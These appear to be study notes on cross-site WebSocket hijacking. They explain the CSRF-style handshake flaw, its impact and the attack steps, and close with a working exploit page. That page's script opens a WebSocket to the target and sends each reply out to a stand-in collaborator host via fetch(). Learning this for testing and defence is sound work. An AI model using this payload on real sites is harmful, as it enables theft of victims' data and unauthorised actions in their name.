## XS WS Hijacking
What is it?
* CSRF vuln in WS handshake
* when WS handshake reliant on HTTP cookies for session handling (no CSRF tokens)
* Create malicious web page and establish WS connection
* Send messages to server via the connection
	* Unlike CSRF, there are two-way interaction with compromised app.

Impact
* Perform unauthorised actions pretending to be the victim user.
* Retrieve sensitive data

Performing an attack
* review handshakes app carries out. 
   	* Work out if they are protected against CSRF
   	* do they only do session management through cookies
* Sec-WebSocket-Key is NOT used for session handling.
* What to do once you've made a connection
   	* Send messages to perform actions on anothers behalf
   	* Send messages to get sensitive data
   	* Wait until incoming messages containing that data.

Sample attack
* Click around and check for WS interactions and if there are no CSRF tokens
   	* What responses are being sent back? Key Words? “Ready”?
* Find URL that makes initial WS handshake request
* Create your own exploit server:
<script>
    websocket = new WebSocket('wss://the-websocket-URL')
    websocket.onopen = start
    websocket.onmessage = handleReply
    function start(event) {
      websocket.send("READY");
    }
		function handleReply(event) {
		  fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
		}
</script>                        
* open burp collaborator
* poll for stuff

